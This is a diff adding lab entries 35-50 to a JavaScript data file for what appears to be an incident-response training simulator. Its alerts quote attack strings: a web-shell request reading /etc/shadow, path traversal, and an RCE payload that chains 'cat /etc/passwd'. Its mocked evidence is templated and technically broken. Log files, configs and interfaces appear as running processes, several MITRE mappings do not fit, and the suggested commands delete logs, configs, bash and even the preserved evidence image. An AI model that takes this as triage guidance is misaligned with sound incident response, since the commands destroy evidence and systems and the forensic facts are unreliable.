+    "categoryTitle": "Module 07: Log Analysis & Journalctl Triage (Labs 31-35)",
+    "caseId": "INC-2026-8835",
+    "title": "Lab 35: Non-Existent User Account Probe Flooding",
+    "severity": "LOW",
+    "mitreId": "T1589",
+    "mitreName": "Technique T1589",
+    "targetHost": "bastion-01",
+    "targetIP": "10.0.0.1",
+    "alertBriefing": "SIEM Alert #8835: Repeated probes for 'invalid user admin', 'invalid user test'.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  1100 85.0  0.4  12480  4012 ?        R    14:20  15:42 /var/log/auth.log\nroot      1099  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /var/log/auth.log",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.0.1:54102  198.51.100.200:4444 users:((\"var\",pid=1100,fd=3))",
+      "auth": "Aug 03 14:19:58 bastion-01 auditd[1200]: SYSCALL=execve exe=\"/var/log/auth.log\" pid=1100 uid=1000\nAug 03 14:20:00 bastion-01 sshd[4512]: Session opened for user root from 198.51.100.200",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /var/log/auth.log"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 1100",
+      "ss -antp | grep 198.51.100.200",
+      "ls -la /var/log/auth.log",
+      "kill -9 1100",
+      "rm -f /var/log/auth.log",
+      "sudo ufw deny out to 198.51.100.200"
+    ],
+    "targetPid": "1100",
+    "targetFile": "/var/log/auth.log",
+    "targetIp": "198.51.100.200",
+    "containmentCmd": "fail2ban-client set sshd banip 198.51.100.200",
+    "teluguTip": "Enforce Fail2ban to automatically ban IPs attempting logins to non-existent users!"
+  },
+  {
+    "id": "lab36",
+    "labNumber": 36,
+    "categoryId": 8,
+    "categoryTitle": "Module 08: Web Server & Web Shell Defense (Labs 36-40)",
+    "caseId": "INC-2026-8836",
+    "title": "Lab 36: PHP Web Shell Command Execution Defense",
+    "severity": "CRITICAL",
+    "mitreId": "T1505.003",
+    "mitreName": "Technique T1505.003",
+    "targetHost": "web-server-01",
+    "targetIP": "192.168.1.100",
+    "alertBriefing": "SIEM Alert #8836: HTTP GET request to /uploads/shell.php?cmd=cat%20/etc/shadow.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  1200 85.0  0.4  12480  4012 ?        R    14:20  15:42 /var/www/html/uploads/shell.php\nroot      1199  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /var/www/html/uploads/shell.php",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.100:54102  10.0.0.45:4444 users:((\"var\",pid=1200,fd=3))",
+      "auth": "Aug 03 14:19:58 web-server-01 auditd[1200]: SYSCALL=execve exe=\"/var/www/html/uploads/shell.php\" pid=1200 uid=1000\nAug 03 14:20:00 web-server-01 sshd[4512]: Session opened for user root from 10.0.0.45",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /var/www/html/uploads/shell.php"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 1200",
+      "ss -antp | grep 10.0.0.45",
+      "ls -la /var/www/html/uploads/shell.php",
+      "kill -9 1200",
+      "rm -f /var/www/html/uploads/shell.php",
+      "sudo ufw deny out to 10.0.0.45"
+    ],
+    "targetPid": "1200",
+    "targetFile": "/var/www/html/uploads/shell.php",
+    "targetIp": "10.0.0.45",
+    "containmentCmd": "rm -f /var/www/html/uploads/shell.php",
+    "teluguTip": "Delete web shell file immediately and restrict upload directory permissions!"
+  },
+  {
+    "id": "lab37",
+    "labNumber": 37,
+    "categoryId": 8,
+    "categoryTitle": "Module 08: Web Server & Web Shell Defense (Labs 36-40)",
+    "caseId": "INC-2026-8837",
+    "title": "Lab 37: Apache Access Log Vulnerability Scanner Probe",
+    "severity": "LOW",
+    "mitreId": "T1595",
+    "mitreName": "Technique T1595",
+    "targetHost": "web-proxy-01",
+    "targetIP": "10.0.0.2",
+    "alertBriefing": "SIEM Alert #8837: Automated vulnerability scanner (Nikto/Nmap) probing web endpoints.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  900 85.0  0.4  12480  4012 ?        R    14:20  15:42 /var/log/apache2/access.log\nroot      899  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /var/log/apache2/access.log",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.0.2:54102  198.51.100.4:4444 users:((\"var\",pid=900,fd=3))",
+      "auth": "Aug 03 14:19:58 web-proxy-01 auditd[1200]: SYSCALL=execve exe=\"/var/log/apache2/access.log\" pid=900 uid=1000\nAug 03 14:20:00 web-proxy-01 sshd[4512]: Session opened for user root from 198.51.100.4",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /var/log/apache2/access.log"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 900",
+      "ss -antp | grep 198.51.100.4",
+      "ls -la /var/log/apache2/access.log",
+      "kill -9 900",
+      "rm -f /var/log/apache2/access.log",
+      "sudo ufw deny out to 198.51.100.4"
+    ],
+    "targetPid": "900",
+    "targetFile": "/var/log/apache2/access.log",
+    "targetIp": "198.51.100.4",
+    "containmentCmd": "iptables -A INPUT -s 198.51.100.4 -j DROP",
+    "teluguTip": "Filter web scanner IPs returning high 404 rates in access logs!"
+  },
+  {
+    "id": "lab38",
+    "labNumber": 38,
+    "categoryId": 8,
+    "categoryTitle": "Module 08: Web Server & Web Shell Defense (Labs 36-40)",
+    "caseId": "INC-2026-8838",
+    "title": "Lab 38: Nginx Directory Traversal Path Disclosure",
+    "severity": "HIGH",
+    "mitreId": "T1083",
+    "mitreName": "Technique T1083",
+    "targetHost": "nginx-node",
+    "targetIP": "172.16.0.88",
+    "alertBriefing": "SIEM Alert #8838: Directory traversal attack string GET /../../etc/passwd in access.log.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  1400 85.0  0.4  12480  4012 ?        R    14:20  15:42 /etc/nginx/nginx.conf\nroot      1399  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /etc/nginx/nginx.conf",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      172.16.0.88:54102  172.16.0.88:4444 users:((\"etc\",pid=1400,fd=3))",
+      "auth": "Aug 03 14:19:58 nginx-node auditd[1200]: SYSCALL=execve exe=\"/etc/nginx/nginx.conf\" pid=1400 uid=1000\nAug 03 14:20:00 nginx-node sshd[4512]: Session opened for user root from 172.16.0.88",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /etc/nginx/nginx.conf"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 1400",
+      "ss -antp | grep 172.16.0.88",
+      "ls -la /etc/nginx/nginx.conf",
+      "kill -9 1400",
+      "rm -f /etc/nginx/nginx.conf",
+      "sudo ufw deny out to 172.16.0.88"
+    ],
+    "targetPid": "1400",
+    "targetFile": "/etc/nginx/nginx.conf",
+    "targetIp": "172.16.0.88",
+    "containmentCmd": "nginx -s reload",
+    "teluguTip": "Sanitize URI inputs in web server configuration to prevent path traversal!"
+  },
+  {
+    "id": "lab39",
+    "labNumber": 39,
+    "categoryId": 8,
+    "categoryTitle": "Module 08: Web Server & Web Shell Defense (Labs 36-40)",
+    "caseId": "INC-2026-8839",
+    "title": "Lab 39: SQL Injection Database Exfiltration Log Triage",
+    "severity": "HIGH",
+    "mitreId": "T1190",
+    "mitreName": "Technique T1190",
+    "targetHost": "sql-web-node",
+    "targetIP": "10.0.5.2",
+    "alertBriefing": "SIEM Alert #8839: SQL injection payload UNION SELECT in HTTP GET parameter.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  3100 85.0  0.4  12480  4012 ?        R    14:20  15:42 /var/log/nginx/access.log\nroot      3099  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /var/log/nginx/access.log",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.5.2:54102  198.51.100.77:4444 users:((\"var\",pid=3100,fd=3))",
+      "auth": "Aug 03 14:19:58 sql-web-node auditd[1200]: SYSCALL=execve exe=\"/var/log/nginx/access.log\" pid=3100 uid=1000\nAug 03 14:20:00 sql-web-node sshd[4512]: Session opened for user root from 198.51.100.77",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /var/log/nginx/access.log"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 3100",
+      "ss -antp | grep 198.51.100.77",
+      "ls -la /var/log/nginx/access.log",
+      "kill -9 3100",
+      "rm -f /var/log/nginx/access.log",
+      "sudo ufw deny out to 198.51.100.77"
+    ],
+    "targetPid": "3100",
+    "targetFile": "/var/log/nginx/access.log",
+    "targetIp": "198.51.100.77",
+    "containmentCmd": "ufw deny from 198.51.100.77",
+    "teluguTip": "Block SQL injection source IPs and enforce prepared SQL statements!"
+  },
+  {
+    "id": "lab40",
+    "labNumber": 40,
+    "categoryId": 8,
+    "categoryTitle": "Module 08: Web Server & Web Shell Defense (Labs 36-40)",
+    "caseId": "INC-2026-8840",
+    "title": "Lab 40: Remote Command Execution (RCE) Payload Analysis",
+    "severity": "CRITICAL",
+    "mitreId": "T1190",
+    "mitreName": "Technique T1190",
+    "targetHost": "api-server",
+    "targetIP": "192.168.1.150",
+    "alertBriefing": "SIEM Alert #8840: RCE payload ping -c 4 127.0.0.1; cat /etc/passwd executed via web form.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  8801 85.0  0.4  12480  4012 ?        R    14:20  15:42 api-process\nroot      8800  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c api-process",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.150:54102  192.168.1.150:4444 users:((\"bash\",pid=8801,fd=3))",
+      "auth": "Aug 03 14:19:58 api-server auditd[1200]: SYSCALL=execve exe=\"api-process\" pid=8801 uid=1000\nAug 03 14:20:00 api-server sshd[4512]: Session opened for user root from 192.168.1.150",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 api-process"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 8801",
+      "ss -antp | grep 192.168.1.150",
+      "ls -la api-process",
+      "kill -9 8801",
+      "rm -f api-process",
+      "sudo ufw deny out to 192.168.1.150"
+    ],
+    "targetPid": "8801",
+    "targetFile": "api-process",
+    "targetIp": "192.168.1.150",
+    "containmentCmd": "pkill -u www-data",
+    "teluguTip": "Sanitize web application shell execution functions like system() and exec()!"
+  },
+  {
+    "id": "lab41",
+    "labNumber": 41,
+    "categoryId": 9,
+    "categoryTitle": "Module 09: Malware, Ransomware & Memory Forensics (Labs 41-45)",
+    "caseId": "INC-2026-8841",
+    "title": "Lab 41: GPG Encrypted Ransomware Staging Triage",
+    "severity": "CRITICAL",
+    "mitreId": "T1486",
+    "mitreName": "Technique T1486",
+    "targetHost": "prod-db-01",
+    "targetIP": "10.0.2.1",
+    "alertBriefing": "SIEM Alert #8841: GPG utility compressing and encrypting database backups in /tmp.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  14200 85.0  0.4  12480  4012 ?        R    14:20  15:42 /tmp/staged_data.tar.gz.gpg\nroot      14199  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /tmp/staged_data.tar.gz.gpg",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.2.1:54102  10.0.2.1:4444 users:((\"tmp\",pid=14200,fd=3))",
+      "auth": "Aug 03 14:19:58 prod-db-01 auditd[1200]: SYSCALL=execve exe=\"/tmp/staged_data.tar.gz.gpg\" pid=14200 uid=1000\nAug 03 14:20:00 prod-db-01 sshd[4512]: Session opened for user root from 10.0.2.1",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /tmp/staged_data.tar.gz.gpg"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 14200",
+      "ss -antp | grep 10.0.2.1",
+      "ls -la /tmp/staged_data.tar.gz.gpg",
+      "kill -9 14200",
+      "rm -f /tmp/staged_data.tar.gz.gpg",
+      "sudo ufw deny out to 10.0.2.1"
+    ],
+    "targetPid": "14200",
+    "targetFile": "/tmp/staged_data.tar.gz.gpg",
+    "targetIp": "10.0.2.1",
+    "containmentCmd": "kill -9 14200 && rm -f /tmp/*.gpg",
+    "teluguTip": "Ransomware pre-encryption staging compresses database dumps. Terminate GPG process!"
+  },
+  {
+    "id": "lab42",
+    "labNumber": 42,
+    "categoryId": 9,
+    "categoryTitle": "Module 09: Malware, Ransomware & Memory Forensics (Labs 41-45)",
+    "caseId": "INC-2026-8842",
+    "title": "Lab 42: Kernel Rootkit System Call Hooking Triage",
+    "severity": "CRITICAL",
+    "mitreId": "T1014",
+    "mitreName": "Technique T1014",
+    "targetHost": "kernel-node",
+    "targetIP": "192.168.1.33",
+    "alertBriefing": "SIEM Alert #8842: Kernel module 'reptile_rk.ko' loaded into kernel hooking sys_call_table.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  8901 85.0  0.4  12480  4012 ?        R    14:20  15:42 reptile_rk.ko\nroot      8900  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c reptile_rk.ko",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.33:54102  192.168.1.33:4444 users:((\"bash\",pid=8901,fd=3))",
+      "auth": "Aug 03 14:19:58 kernel-node auditd[1200]: SYSCALL=execve exe=\"reptile_rk.ko\" pid=8901 uid=1000\nAug 03 14:20:00 kernel-node sshd[4512]: Session opened for user root from 192.168.1.33",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 reptile_rk.ko"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 8901",
+      "ss -antp | grep 192.168.1.33",
+      "ls -la reptile_rk.ko",
+      "kill -9 8901",
+      "rm -f reptile_rk.ko",
+      "sudo ufw deny out to 192.168.1.33"
+    ],
+    "targetPid": "8901",
+    "targetFile": "reptile_rk.ko",
+    "targetIp": "192.168.1.33",
+    "containmentCmd": "rmmod reptile_rk",
+    "teluguTip": "Detect rootkit kernel modules via lsmod and unload using rmmod!"
+  },
+  {
+    "id": "lab43",
+    "labNumber": 43,
+    "categoryId": 9,
+    "categoryTitle": "Module 09: Malware, Ransomware & Memory Forensics (Labs 41-45)",
+    "caseId": "INC-2026-8843",
+    "title": "Lab 43: In-Memory Process Memory Dump Analysis",
+    "severity": "HIGH",
+    "mitreId": "T1003",
+    "mitreName": "Technique T1003",
+    "targetHost": "mem-node",
+    "targetIP": "10.0.8.2",
+    "alertBriefing": "SIEM Alert #8843: Direct read access on /proc/PID/mem targeting SSH keys in RAM.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  9102 85.0  0.4  12480  4012 ?        R    14:20  15:42 /proc/9102/mem\nroot      9101  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /proc/9102/mem",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.8.2:54102  10.0.8.2:4444 users:((\"proc\",pid=9102,fd=3))",
+      "auth": "Aug 03 14:19:58 mem-node auditd[1200]: SYSCALL=execve exe=\"/proc/9102/mem\" pid=9102 uid=1000\nAug 03 14:20:00 mem-node sshd[4512]: Session opened for user root from 10.0.8.2",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /proc/9102/mem"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 9102",
+      "ss -antp | grep 10.0.8.2",
+      "ls -la /proc/9102/mem",
+      "kill -9 9102",
+      "rm -f /proc/9102/mem",
+      "sudo ufw deny out to 10.0.8.2"
+    ],
+    "targetPid": "9102",
+    "targetFile": "/proc/9102/mem",
+    "targetIp": "10.0.8.2",
+    "containmentCmd": "kill -9 9102",
+    "teluguTip": "Protect process memory structures by restricting ptrace scope sysctl kernel.yama.ptrace_scope=1!"
+  },
+  {
+    "id": "lab44",
+    "labNumber": 44,
+    "categoryId": 9,
+    "categoryTitle": "Module 09: Malware, Ransomware & Memory Forensics (Labs 41-45)",
+    "caseId": "INC-2026-8844",
+    "title": "Lab 44: Encrypted Base64 Payload Dropper Detection",
+    "severity": "HIGH",
+    "mitreId": "T1027",
+    "mitreName": "Technique T1027",
+    "targetHost": "ci-cd-runner",
+    "targetIP": "172.16.8.1",
+    "alertBriefing": "SIEM Alert #8844: Encoded base64 string piped to bash command execution.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  5510 85.0  0.4  12480  4012 ?        R    14:20  15:42 bash\nroot      5509  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c bash",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      172.16.8.1:54102  172.16.8.1:4444 users:((\"bash\",pid=5510,fd=3))",
+      "auth": "Aug 03 14:19:58 ci-cd-runner auditd[1200]: SYSCALL=execve exe=\"bash\" pid=5510 uid=1000\nAug 03 14:20:00 ci-cd-runner sshd[4512]: Session opened for user root from 172.16.8.1",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 bash"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 5510",
+      "ss -antp | grep 172.16.8.1",
+      "ls -la bash",
+      "kill -9 5510",
+      "rm -f bash",
+      "sudo ufw deny out to 172.16.8.1"
+    ],
+    "targetPid": "5510",
+    "targetFile": "bash",
+    "targetIp": "172.16.8.1",
+    "containmentCmd": "kill -9 5510",
+    "teluguTip": "Decode base64 command strings using echo '...' | base64 -d to inspect raw payload!"
+  },
+  {
+    "id": "lab45",
+    "labNumber": 45,
+    "categoryId": 9,
+    "categoryTitle": "Module 09: Malware, Ransomware & Memory Forensics (Labs 41-45)",
+    "caseId": "INC-2026-8845",
+    "title": "Lab 45: Shared Memory Space Payload Injection Triage",
+    "severity": "HIGH",
+    "mitreId": "T1055",
+    "mitreName": "Technique T1055",
+    "targetHost": "app-node-09",
+    "targetIP": "192.168.1.77",
+    "alertBriefing": "SIEM Alert #8845: Malicious payload executing out of /dev/shm/.payload.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  7712 85.0  0.4  12480  4012 ?        R    14:20  15:42 /dev/shm/.payload\nroot      7711  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /dev/shm/.payload",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.77:54102  192.168.1.77:4444 users:((\"dev\",pid=7712,fd=3))",
+      "auth": "Aug 03 14:19:58 app-node-09 auditd[1200]: SYSCALL=execve exe=\"/dev/shm/.payload\" pid=7712 uid=1000\nAug 03 14:20:00 app-node-09 sshd[4512]: Session opened for user root from 192.168.1.77",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /dev/shm/.payload"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 7712",
+      "ss -antp | grep 192.168.1.77",
+      "ls -la /dev/shm/.payload",
+      "kill -9 7712",
+      "rm -f /dev/shm/.payload",
+      "sudo ufw deny out to 192.168.1.77"
+    ],
+    "targetPid": "7712",
+    "targetFile": "/dev/shm/.payload",
+    "targetIp": "192.168.1.77",
+    "containmentCmd": "kill -9 7712 && rm -f /dev/shm/.payload",
+    "teluguTip": "Wipe shared memory files in /dev/shm and kill owning process!"
+  },
+  {
+    "id": "lab46",
+    "labNumber": 46,
+    "categoryId": 10,
+    "categoryTitle": "Module 10: Enterprise Incident Containment (Labs 46-50)",
+    "caseId": "INC-2026-8846",
+    "title": "Lab 46: Compromised User Session Force Teardown",
+    "severity": "HIGH",
+    "mitreId": "T1563",
+    "mitreName": "Technique T1563",
+    "targetHost": "host-46",
+    "targetIP": "192.168.1.46",
+    "alertBriefing": "SIEM Alert #8846: Attacker maintaining active interactive SSH session on pts/2.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  4600 85.0  0.4  12480  4012 ?        R    14:20  15:42 pts/2\nroot      4599  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c pts/2",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.46:54102  192.168.1.46:4444 users:((\"2\",pid=4600,fd=3))",
+      "auth": "Aug 03 14:19:58 host-46 auditd[1200]: SYSCALL=execve exe=\"pts/2\" pid=4600 uid=1000\nAug 03 14:20:00 host-46 sshd[4512]: Session opened for user root from 192.168.1.46",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 pts/2"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 4600",
+      "ss -antp | grep 192.168.1.46",
+      "ls -la pts/2",
+      "kill -9 4600",
+      "rm -f pts/2",
+      "sudo ufw deny out to 192.168.1.46"
+    ],
+    "targetPid": "4600",
+    "targetFile": "pts/2",
+    "targetIp": "192.168.1.46",
+    "containmentCmd": "pkill -9 -u attacker",
+    "teluguTip": "Forcefully disconnect all attacker interactive sessions using pkill -9 -u <username>!"
+  },
+  {
+    "id": "lab47",
+    "labNumber": 47,
+    "categoryId": 10,
+    "categoryTitle": "Module 10: Enterprise Incident Containment (Labs 46-50)",
+    "caseId": "INC-2026-8847",
+    "title": "Lab 47: Host Network Interface Emergency Isolation",
+    "severity": "CRITICAL",
+    "mitreId": "T1489",
+    "mitreName": "Technique T1489",
+    "targetHost": "host-47",
+    "targetIP": "192.168.1.47",
+    "alertBriefing": "SIEM Alert #8847: Active lateral movement outbreak detected across local subnet.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  4700 85.0  0.4  12480  4012 ?        R    14:20  15:42 eth0\nroot      4699  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c eth0",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.47:54102  192.168.1.47:4444 users:((\"bash\",pid=4700,fd=3))",
+      "auth": "Aug 03 14:19:58 host-47 auditd[1200]: SYSCALL=execve exe=\"eth0\" pid=4700 uid=1000\nAug 03 14:20:00 host-47 sshd[4512]: Session opened for user root from 192.168.1.47",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 eth0"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 4700",
+      "ss -antp | grep 192.168.1.47",
+      "ls -la eth0",
+      "kill -9 4700",
+      "rm -f eth0",
+      "sudo ufw deny out to 192.168.1.47"
+    ],
+    "targetPid": "4700",
+    "targetFile": "eth0",
+    "targetIp": "192.168.1.47",
+    "containmentCmd": "ip link set eth0 down",
+    "teluguTip": "Isolate compromised host from network immediately using ip link set eth0 down!"
+  },
+  {
+    "id": "lab48",
+    "labNumber": 48,
+    "categoryId": 10,
+    "categoryTitle": "Module 10: Enterprise Incident Containment (Labs 46-50)",
+    "caseId": "INC-2026-8848",
+    "title": "Lab 48: Emergency Firewall Lockdown Policy Enforcement",
+    "severity": "CRITICAL",
+    "mitreId": "T1562",
+    "mitreName": "Technique T1562",
+    "targetHost": "host-48",
+    "targetIP": "192.168.1.48",
+    "alertBriefing": "SIEM Alert #8848: Ransomware encryption activity detected on network shares.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  4800 85.0  0.4  12480  4012 ?        R    14:20  15:42 ufw\nroot      4799  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c ufw",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.48:54102  192.168.1.48:4444 users:((\"bash\",pid=4800,fd=3))",
+      "auth": "Aug 03 14:19:58 host-48 auditd[1200]: SYSCALL=execve exe=\"ufw\" pid=4800 uid=1000\nAug 03 14:20:00 host-48 sshd[4512]: Session opened for user root from 192.168.1.48",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 ufw"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 4800",
+      "ss -antp | grep 192.168.1.48",
+      "ls -la ufw",
+      "kill -9 4800",
+      "rm -f ufw",
+      "sudo ufw deny out to 192.168.1.48"
+    ],
+    "targetPid": "4800",
+    "targetFile": "ufw",
+    "targetIp": "192.168.1.48",
+    "containmentCmd": "ufw default deny incoming && ufw default deny outgoing",
+    "teluguTip": "Enforce complete firewall lockdown using ufw default deny incoming & outgoing!"
+  },
+  {
+    "id": "lab49",
+    "labNumber": 49,
+    "categoryId": 10,
+    "categoryTitle": "Module 10: Enterprise Incident Containment (Labs 46-50)",
+    "caseId": "INC-2026-8849",
+    "title": "Lab 49: Compromised Host Quarantine Protocol Execution",
+    "severity": "HIGH",
+    "mitreId": "T1070",
+    "mitreName": "Technique T1070",
+    "targetHost": "host-49",
+    "targetIP": "192.168.1.49",
+    "alertBriefing": "SIEM Alert #8849: Data exfiltration session active to external rogue IP 198.51.100.99.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  4900 85.0  0.4  12480  4012 ?        R    14:20  15:42 iptables\nroot      4899  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c iptables",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.49:54102  198.51.100.99:4444 users:((\"bash\",pid=4900,fd=3))",
+      "auth": "Aug 03 14:19:58 host-49 auditd[1200]: SYSCALL=execve exe=\"iptables\" pid=4900 uid=1000\nAug 03 14:20:00 host-49 sshd[4512]: Session opened for user root from 198.51.100.99",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 iptables"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 4900",
+      "ss -antp | grep 198.51.100.99",
+      "ls -la iptables",
+      "kill -9 4900",
+      "rm -f iptables",
+      "sudo ufw deny out to 198.51.100.99"
+    ],
+    "targetPid": "4900",
+    "targetFile": "iptables",
+    "targetIp": "198.51.100.99",
+    "containmentCmd": "iptables -F && iptables -A INPUT -j DROP",
+    "teluguTip": "Flush existing firewall rules and drop all traffic to quarantine host!"
+  },
+  {
+    "id": "lab50",
+    "labNumber": 50,
+    "categoryId": 10,
+    "categoryTitle": "Module 10: Enterprise Incident Containment (Labs 46-50)",
+    "caseId": "INC-2026-8850",
+    "title": "Lab 50: Master Incident Evidence Preservation & Triage",
+    "severity": "CRITICAL",
+    "mitreId": "T1005",
+    "mitreName": "Technique T1005",
+    "targetHost": "host-50",
+    "targetIP": "192.168.1.50",
+    "alertBriefing": "SIEM Alert #8850: Incident triage phase completed. Preserve forensic memory & disk artifacts.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  5000 85.0  0.4  12480  4012 ?        R    14:20  15:42 /tmp/evidence.img\nroot      4999  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /tmp/evidence.img",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.50:54102  192.168.1.50:4444 users:((\"tmp\",pid=5000,fd=3))",
+      "auth": "Aug 03 14:19:58 host-50 auditd[1200]: SYSCALL=execve exe=\"/tmp/evidence.img\" pid=5000 uid=1000\nAug 03 14:20:00 host-50 sshd[4512]: Session opened for user root from 192.168.1.50",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /tmp/evidence.img"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 5000",
+      "ss -antp | grep 192.168.1.50",
+      "ls -la /tmp/evidence.img",
+      "kill -9 5000",
+      "rm -f /tmp/evidence.img",
+      "sudo ufw deny out to 192.168.1.50"
+    ],
+    "targetPid": "5000",
+    "targetFile": "/tmp/evidence.img",
+    "targetIp": "192.168.1.50",
+    "containmentCmd": "dd if=/dev/sda of=/tmp/evidence.img bs=4M",
+    "teluguTip": "Preserve drive evidence using dd before powering down or rebooting compromised system!"
+  }
+];
+
+if (typeof window !== 'undefined') {
+  window.INCIDENT_LAB_CATEGORIES = INCIDENT_LAB_CATEGORIES;
+  window.INCIDENT_LABS = INCIDENT_LABS;
+}
